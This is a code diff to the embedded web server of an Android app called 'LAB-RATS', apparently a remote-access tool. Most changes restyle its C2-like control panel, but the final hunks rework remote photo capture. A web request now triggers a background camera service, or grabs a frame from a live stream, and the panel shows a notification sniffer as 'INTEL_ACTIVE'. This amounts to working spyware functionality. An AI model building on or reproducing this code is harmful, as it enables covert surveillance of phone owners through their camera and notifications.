@@ -140,7 +140,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "}" +
             "h1, h2, h3, .title-font { font-family: 'C2TerminalFont', 'Orbitron', sans-serif !important; font-weight: 900 !important; }" +
             ".title-font {" +
-            "  font-family: 'C2TerminalFont', 'Orbitron', sans-serif !important;" +
+            "  font-family: 'Orbitron', sans-serif !important;" +
             "  font-weight: 900 !important;" +
             "  font-size: 3.5rem;" +
             "  color: var(--neon-cyan);" +
@@ -148,7 +148,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  letter-spacing: 12px;" +
             "  margin-right: -12px;" +
             "  text-shadow: 0 0 15px rgba(0, 242, 255, 0.6);" +
-            "  margin-bottom: 15px;" +
+            "  margin-bottom: 25px;" +
             "  animation: scanline 8s linear infinite;" +
             "  display: block;" +
             "}" +
@@ -165,12 +165,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".desktop-only { display: inline; }" +
             ".mobile-only { display: none; }" +
             "@keyframes scanline { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }" +
-            ".glitch-container { position: relative; margin-top: -10px; margin-bottom: 25px; }" +
+            ".glitch-container { position: relative; margin-bottom: 25px; }" +
             ".glitch { font-family: 'Orbitron', sans-serif; color: #fff; font-size: 0.9rem; font-weight: bold; letter-spacing: 3px; text-transform: uppercase; position: relative; display: inline-block; }" +
             ".glitch::before, .glitch::after { content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; height: 100%; }" +
             ".glitch::before { left: 2px; text-shadow: -2px 0 var(--neon-cyan); clip: rect(44px, 450px, 56px, 0); animation: glitch-anim 5s infinite linear alternate-reverse; }" +
             ".glitch::after { left: -2px; text-shadow: -2px 0 var(--neon-red); clip: rect(44px, 450px, 56px, 0); animation: glitch-anim2 5s infinite linear alternate-reverse; }" +
-            ".version-text { font-family: 'Orbitron', sans-serif; color: var(--neon-cyan); opacity: 0.6; font-size: 0.8rem; letter-spacing: 4px; margin-top: 25px; margin-bottom: 25px; }" +
+            ".version-text { font-family: 'Orbitron', sans-serif; color: var(--neon-cyan); opacity: 0.6; font-size: 0.8rem; letter-spacing: 4px; margin-bottom: 25px; }" +
             "@keyframes glitch-anim { 0% { clip: rect(31px, 9999px, 94px, 0); } 5% { clip: rect(70px, 9999px, 71px, 0); } 10% { clip: rect(29px, 9999px, 83px, 0); } 15% { clip: rect(16px, 9999px, 91px, 0); } 20% { clip: rect(2px, 9999px, 23px, 0); } 25% { clip: rect(67px, 9999px, 40px, 0); } 30% { clip: rect(56px, 9999px, 49px, 0); } 35% { clip: rect(28px, 9999px, 34px, 0); } 40% { clip: rect(82px, 9999px, 25px, 0); } 45% { clip: rect(21px, 9999px, 53px, 0); } 50% { clip: rect(44px, 9999px, 12px, 0); } 55% { clip: rect(13px, 9999px, 48px, 0); } 60% { clip: rect(54px, 9999px, 97px, 0); } 65% { clip: rect(51px, 9999px, 60px, 0); } 70% { clip: rect(93px, 9999px, 85px, 0); } 75% { clip: rect(38px, 9999px, 8px, 0); } 80% { clip: rect(10px, 9999px, 63px, 0); } 85% { clip: rect(11px, 9999px, 62px, 0); } 90% { clip: rect(87px, 9999px, 79px, 0); } 95% { clip: rect(49px, 9999px, 2px, 0); } 100% { clip: rect(3px, 9999px, 45px, 0); } }" +
             "@keyframes glitch-anim2 { 0% { clip: rect(65px, 9999px, 100px, 0); } 5% { clip: rect(52px, 9999px, 64px, 0); } 10% { clip: rect(90px, 9999px, 73px, 0); } 15% { clip: rect(3px, 9999px, 95px, 0); } 20% { clip: rect(64px, 9999px, 70px, 0); } 25% { clip: rect(74px, 9999px, 4px, 0); } 30% { clip: rect(31px, 9999px, 17px, 0); } 35% { clip: rect(20px, 9999px, 35px, 0); } 40% { clip: rect(47px, 9999px, 9px, 0); } 45% { clip: rect(69px, 9999px, 69px, 0); } 50% { clip: rect(44px, 9999px, 5px, 0); } 55% { clip: rect(1px, 9999px, 81px, 0); } 60% { clip: rect(53px, 9999px, 26px, 0); } 65% { clip: rect(91px, 9999px, 11px, 0); } 70% { clip: rect(73px, 9999px, 100px, 0); } 75% { clip: rect(24px, 9999px, 17px, 0); } 80% { clip: rect(43px, 9999px, 90px, 0); } 85% { clip: rect(61px, 9999px, 1px, 0); } 90% { clip: rect(81px, 9999px, 2px, 0); } 95% { clip: rect(56px, 9999px, 1px, 0); } 100% { clip: rect(4px, 9999px, 54px, 0); } }" +
             ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 40px; }" +
@@ -278,13 +278,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "@media (max-width: 768px) {" +
             "  body { overflow-x: hidden; width: 100%; font-size: 14px; margin: 0; padding: 0; -webkit-text-size-adjust: 100%; }" +
             "  .container { width: 100vw; overflow-x: hidden; padding: 10px; box-sizing: border-box; margin: 0; }" +
-            "  .header { padding: 15px 0; margin-bottom: 10px; display: flex; flex-direction: column; align-items: center; gap: 2px; overflow: visible; }" +
-            "  .title-font { font-family: 'Orbitron', sans-serif !important; font-size: 1.1rem !important; letter-spacing: 1.5px !important; margin-right: -1.5px !important; font-weight: 900 !important; text-align: center !important; width: 100% !important; display: block !important; margin: 0 !important; white-space: nowrap !important; overflow: visible !important; position: relative; z-index: 10; line-height: 1.2; }" +
-            "  .glitch-container { margin-top: 15px !important; margin-bottom: 15px !important; height: 12px; }" +
-            "  .version-text { font-size: 0.45rem !important; letter-spacing: 1px !important; margin: 15px 0 !important; }" +
-            "  .glitch { font-size: 0.55rem; letter-spacing: 0.5px; }" +
+            "  .header { padding: 15px 0; margin-bottom: 10px; display: flex; flex-direction: column; align-items: center; gap: 0; overflow: visible; }" +
+            "  .title-font { font-family: 'Orbitron', sans-serif !important; font-size: 1.55rem !important; letter-spacing: 1.5px !important; margin-right: -1.5px !important; font-weight: 900 !important; text-align: center !important; width: 100% !important; display: block !important; margin: 0 0 10px 0 !important; white-space: nowrap !important; overflow: visible !important; position: relative; z-index: 10; line-height: 1.2; }" +
+            "  .glitch-container { margin: 0 0 10px 0 !important; height: auto !important; }" +
+            "  .version-text { font-size: 0.45rem !important; letter-spacing: 1px !important; margin: 0 0 10px 0 !important; }" +
+            "  .glitch { font-size: 0.55rem; letter-spacing: 1px; }" +
             "  .nav { gap: 4px; justify-content: center; width: 100%; padding: 0 4px; box-sizing: border-box; }" +
-            "  .nav a { padding: 10px 1px; font-size: 0.45rem; border-radius: 12px; flex: 1 1 calc(33.33% - 6px); text-align: center; letter-spacing: 0; min-width: 0; font-weight: normal; }" +
+            "  .nav a { padding: 10px 1px; font-size: 0.6rem; border-radius: 12px; flex: 1 1 calc(33.33% - 6px); text-align: center; letter-spacing: 0; min-width: 0; font-weight: normal; }" +
             "  .card { padding: 15px; margin-bottom: 12px; border-radius: 10px; width: 100%; box-sizing: border-box; overflow: hidden; }" +
             "  .info-grid { grid-template-columns: 1fr !important; gap: 8px; }" +
             "  .info-item { padding: 12px; }" +
@@ -293,7 +293,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  button:not(.btn-small), .btn:not(.btn-small) { width: 100% !important; min-width: 0 !important; text-align: center; padding: 14px 10px !important; margin-bottom: 8px; border-radius: 30px; display: block !important; font-size: 0.75rem !important; white-space: nowrap !important; }" +
             "  .btn-small { width: auto !important; min-width: 0 !important; display: inline-block !important; padding: 4px 8px !important; font-size: 0.6rem !important; letter-spacing: 0 !important; border-radius: 15px !important; margin-bottom: 5px !important; }" +
             "  .btn-back { width: 100%; justify-content: center; padding: 10px; font-size: 0.7rem; border-radius: 20px; }" +
-            "  .watermark { opacity: 0.08 !important; height: 45px !important; top: 12px !important; left: 8px !important; transform: none !important; z-index: 0; }" +
+            "  .watermark { opacity: 0.15 !important; height: 74px !important; top: 25px !important; left: -9px !important; transform: none !important; z-index: 0; }" +
+            "  .intel-status { font-size: 0.55rem !important; white-space: nowrap !important; }" +
             "  table { display: block; overflow-x: auto; width: 100%; -webkit-overflow-scrolling: touch; }" +
             "  th, td { padding: 10px 8px; font-size: 0.65rem; }" +
             "  h2 { font-size: 1.0rem !important; flex-wrap: wrap !important; gap: 8px !important; display: flex !important; }" +
@@ -304,8 +305,10 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .file-info { min-width: 0; }" +
             "  .file-name { font-size: 0.8rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }" +
             "  .file-icon { margin-right: 10px; width: 25px; font-size: 1.1rem; }" +
+            "  .password-title { font-size: 0.55rem !important; letter-spacing: 1px !important; }" +
             "}" +
             
+            "textarea { resize: vertical; width: 100%; max-width: 100%; }" +
             "table { width: 100%; border-collapse: separate; border-spacing: 0 8px; }" +
             "th { text-align: left; padding: 15px; color: var(--neon-cyan); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; opacity: 0.7; }" +
             "td { padding: 15px; background: rgba(255,255,255,0.03); border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05); }" +
@@ -328,7 +331,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<div class=\"container\">" +
             "  <div class=\"header\">" +
             "    <img src=\"/logo\" class=\"watermark\" alt=\"LAB-RATS\">" +
-            "    <div class=\"title-font\" style=\"font-family: 'C2TerminalFont', 'Orbitron', sans-serif !important;\">LAB-RATS</div>" +
+            "    <div class=\"title-font\">LAB-RATS</div>" +
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
             "    </div>" +
@@ -352,20 +355,29 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<script>" +
             "  function updateNav() {" +
             "    const path = window.location.pathname;" +
-            "    document.querySelectorAll('.nav a').forEach(link => {" +
-            "      const href = link.getAttribute('href');" +
-            "      link.classList.remove('active');" +
-            "      // Exact match for root, prefix match for others\n" +
-            "      if (href === '/' && path === '/') {" +
-            "        link.classList.add('active');" +
-            "      } else if (href !== '/' && path.startsWith(href)) {" +
-            "        link.classList.add('active');" +
-            "      }" +
-            "    });" +
+            "    const links = document.querySelectorAll('.nav a');" +
+            "    links.forEach(l => l.classList.remove('active'));" +
+            "    // NUCLEAR FIX for double-lit tabs: Find exact match first, then longest prefix\n" +
+            "    let bestMatch = null;\n" +
+            "    for (let link of links) {\n" +
+            "      const href = link.getAttribute('href');\n" +
+            "      if (path === href) {\n" +
+            "        bestMatch = link;\n" +
+            "        break;\n" +
+            "      } else if (href !== '/' && path.startsWith(href)) {\n" +
+            "        if (!bestMatch || href.length > bestMatch.getAttribute('href').length) {\n" +
+            "          bestMatch = link;\n" +
+            "        }\n" +
+            "      }\n" +
+            "    }\n" +
+            "    if (bestMatch) bestMatch.classList.add('active');\n" +
             "  }" +
             "  updateNav();" +
-            "  window.addEventListener('popstate', updateNav);" +
-            "  window.addEventListener('pageshow', (e) => { if(e.persisted) updateNav(); });" +
+            "  window.onpopstate = updateNav;\n" +
+            "  window.addEventListener('pageshow', updateNav);" +
+            "  document.addEventListener('visibilitychange', () => { if(document.visibilityState === 'visible') updateNav(); });" +
+            "  // Extra insurance for phone back button\n" +
+            "  setInterval(updateNav, 1000);\n" +
             "</script>" +
             "</body>" +
             "</html>";
@@ -516,12 +528,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 boolean isLoggedIn = (token != null && !token.isEmpty() && token.equals(sessionToken));
 
                 if (!isLoggedIn) {
-                    logActivity("UPLINK_DENIED: Unauthorized access attempt to " + uri);
                     if (uri.equals("/logo")) {
                         response = serveLogo();
                     } else if (uri.startsWith("/font/orbitron.ttf")) {
                         response = serveFont();
                     } else {
+                        logActivity("UPLINK_DENIED: Unauthorized access attempt to " + uri);
                         // For assets, return 401. For pages, return login wall.
                         if (uri.contains(".") && !uri.equals("/")) {
                             response = newFixedLengthResponse(Response.Status.UNAUTHORIZED, "text/plain", "ACCESS_DENIED_REAUTHENTICATE");
@@ -676,7 +688,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
             }
             byte[] bytes = buffer.toByteArray();
             Log.d("LabRATS-Server", "Serving font 'Orbitron' - size: " + bytes.length);
-            logActivity("SYSTEM_ASSET: Font 'Orbitron' served (" + bytes.length + " bytes)");
             Response response = newFixedLengthResponse(Response.Status.OK, "font/ttf", new java.io.ByteArrayInputStream(bytes), bytes.length);
             response.addHeader("Cache-Control", "no-cache, must-revalidate");
             response.addHeader("Access-Control-Allow-Origin", "*");
@@ -699,15 +710,16 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<div style=\"display:flex; justify-content:space-between; align-items:center; margin-bottom: 25px;\">");
         html.append("<h2 style=\"margin-bottom:0;\">SYSTEM_MONITOR [" + sessionId + "]</h2>");
         String snifferStatus = NotificationSniffer.isServiceRunning() ? 
-            "<span style=\"color:var(--neon-green); font-size:0.7rem; font-family:monospace;\">&#9679; INTEL_ACTIVE</span>" : 
-            "<span style=\"color:var(--danger); font-size:0.7rem; font-family:monospace;\">&#9675; INTEL_DISCONNECTED</span>";
+            "<span class=\"intel-status\" style=\"color:var(--neon-green); font-size:0.7rem; font-family:monospace;\">&#9679; INTEL_ACTIVE</span>" : 
+            "<span class=\"intel-status\" style=\"color:var(--danger); font-size:0.7rem; font-family:monospace;\">&#9675; INTEL_DISCONNECTED</span>";
         html.append(snifferStatus).append("</div>");
         html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">");
         
         // Server Status
         html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
         html.append("<div class=\"info-label\">UPLINK_STATUS</div>");
-        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan);\">ONLINE</div>");
+        // Status: Green ONLINE if running, Red DOWN otherwise. Since we are serving this, it's ONLINE.
+        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-green); text-shadow: 0 0 5px var(--neon-green);\">ONLINE</div>");
         html.append("</div>");
         
         // Port
@@ -755,7 +767,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
         // Security Settings Card
         html.append("<div class=\"card\" style=\"border-left-color: var(--neon-orange);\">");
-        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-orange);\">CHANGE_INTERFACE_PASSWORD</h3>");
+        html.append("<h3 class=\"password-title\" style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-orange);\">CHANGE_INTERFACE_PASSWORD</h3>");
         html.append("<div style=\"margin-top: 15px;\">");
         html.append("<form action=\"/settings/password\" method=\"POST\" style=\"display: flex; gap: 10px; align-items: center; flex-wrap: wrap;\">");
         html.append("<input type=\"password\" name=\"new_password\" placeholder=\"NEW_PASSWORD\" style=\"background: #000; border: 1px solid var(--neon-orange); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; flex-grow: 1; min-width: 200px;\">");
@@ -1805,8 +1817,42 @@ public class LabRatsHttpServer extends NanoHTTPD {
         }
 
         try {
-            CameraHelper cameraHelper = new CameraHelper(context);
-            byte[] imageData = cameraHelper.capturePhoto(cameraId);
+            byte[] imageData = null;
+            String error = null;
+
+            if (CameraService.isCurrentlyStreaming()) {
+                // If streaming, grab latest frame for instant snapshot
+                imageData = CameraService.getNextFrame(1000);
+                if (imageData == null) error = "Timeout waiting for frame from stream";
+            } else {
+                // Use CameraService's background capture protocol
+                CameraService service = CameraService.getInstance();
+                if (service == null) {
+                    Intent intent = new Intent(context, CameraService.class);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        context.startForegroundService(intent);
+                    } else {
+                        context.startService(intent);
+                    }
+                    // Wait for service initialization
+                    for (int i = 0; i < 10; i++) {
+                        Thread.sleep(200);
+                        service = CameraService.getInstance();
+                        if (service != null) break;
+                    }
+                }
+
+                if (service != null) {
+                    service.capturePhotoBackground(cameraId);
+                    imageData = CameraService.waitForPhoto(12000);
+                    error = CameraService.getLastCaptureError();
+                } else {
+                    // Critical fallback to Helper
+                    CameraHelper cameraHelper = new CameraHelper(context);
+                    imageData = cameraHelper.capturePhoto(cameraId);
+                    error = cameraHelper.getLastError();
+                }
+            }
 
             if (imageData != null && imageData.length > 0) {
                 String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);
@@ -1826,7 +1872,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 html.append("</div>");
 
             } else {
-                String error = cameraHelper.getLastError();
                 html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
                 html.append("<p>Failed to capture photo</p>");
                 if (error != null) {
@@ -1866,8 +1911,23 @@ public class LabRatsHttpServer extends NanoHTTPD {
         }
 
         try {
-            CameraHelper cameraHelper = new CameraHelper(context);
-            byte[] imageData = cameraHelper.capturePhoto(cameraId);
+            byte[] imageData = null;
+            String errorMsg = null;
+
+            if (CameraService.isCurrentlyStreaming()) {
+                imageData = CameraService.getNextFrame(1500);
+            } else {
+                CameraService service = CameraService.getInstance();
+                if (service != null) {
+                    service.capturePhotoBackground(cameraId);
+                    imageData = CameraService.waitForPhoto(12000);
+                    errorMsg = CameraService.getLastCaptureError();
+                } else {
+                    CameraHelper cameraHelper = new CameraHelper(context);
+                    imageData = cameraHelper.capturePhoto(cameraId);
+                    errorMsg = cameraHelper.getLastError();
+                }
+            }
 
             if (imageData != null && imageData.length > 0) {
                 java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
@@ -1876,8 +1936,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         "attachment; filename=\"photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg\"");
                 return response;
             } else {
-                String error = cameraHelper.getLastError();
-                return serveError(error != null ? error : "Failed to capture photo");
+                return serveError(errorMsg != null ? errorMsg : "Failed to capture photo (Hardware Timeout)");
             }
 
         } catch (Exception e) {
